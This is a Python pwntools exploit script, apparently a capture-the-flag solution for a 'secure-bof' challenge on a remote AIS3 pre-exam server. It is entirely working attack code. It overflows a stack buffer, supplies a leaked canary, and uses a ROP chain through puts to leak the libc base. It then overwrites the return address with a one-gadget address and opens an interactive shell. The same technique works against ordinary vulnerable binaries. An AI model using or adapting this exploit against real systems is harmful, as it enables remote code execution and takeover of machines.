#!/usr/bin/env python2
from pwn import *
import subprocess
import sys
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
#r = process('./secure-bof')
r = remote('pre-exam-pwn.ais3.org', 10005)
binary = ELF('./secure-bof')
libc = ELF('./libc.so.6')
pop_rdi = 0x400ba3
main = 0x4009e5

i = 2147483648
buf = 0x601c00

sec = sys.argv[1]

res = subprocess.check_output(['./a.out', sec])

canary = ''.join(map(lambda x: chr(int(x)), res.strip().split(' ')))
print len(canary)

payload = 'A'*256 + canary + 'A'*0x18 + flat(
    pop_rdi,
    binary.got['puts'],
    binary.plt['puts'],
    main
)


r.sendlineafter('>\n', str(i))
r.sendafter('>\n', payload)
libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.symbols['puts']
print hex(libc_base)
magic = libc_base + 0x10a38c

res = subprocess.check_output(['./a.out', str(int(sec)+1)])

canary = ''.join(map(lambda x: chr(int(x)), res.strip().split(' ')))
print len(canary)

payload = 'A'*256 + canary + 'A'*0x18 + p64(magic)


r.sendlineafter('>\n', str(i))
r.sendafter('>\n', payload)

r.interactive()
